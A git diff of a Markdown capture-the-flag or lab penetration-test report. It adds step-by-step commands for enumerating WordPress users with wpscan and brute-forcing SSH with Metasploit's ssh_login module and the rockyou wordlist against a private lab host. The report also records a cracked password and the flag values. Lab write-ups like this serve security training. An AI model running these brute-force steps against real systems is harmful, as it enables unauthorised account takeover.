@@ -30,15 +30,27 @@ The following vulnerabilities were identified on each target:
   - Steven user account has sudo permissions for Python
 
 ### Exploitation
-_TODO: Fill out the details below. Include screenshots where possible._
 
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 - Target 1
   - `flag1`: flag1{b9bbcb33e11b80be759c4e844862482d}
     - **Exploit Used**
-      - Metasploit ssh_login module using the usernames acquired from wpscan and a general password list
-      - Hidden in service.html at /var/www/html
-	  - grep -nr 'flag1' .
+      - Start with a user enumeration of the Wordpress website using Wpscan
+        - `wpscan --url http://192.168.1.110/wordpress --enumerate u`
+        - ![WPScan](Images/Wpscan.png "WPScan")
+      - Using the ssh module in Metasploit we will break into Micheals account
+        - `msfconsole`
+        - `search ssh`
+        - `use auxiliary/scanner/ssh/ssh_login`
+        - `show options`
+        - `set username michael`
+        - `set user_as_pass true`
+        - `set pass_file /usr/share/wordlists/rockyou.txt`
+        - `set rhosts 192.168.1.110`
+        - `set rport 22`
+        - `set stop_on_success true`
+        - ![Metasploit](Images/Metasploit.png "Metasploit SSH Cracker") 
+        - Michael's password is michael
   - `flag2`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
     - **Exploit Used**
       - Metasploit ssh_login module using the usernames acquired from wpscan and a general password list
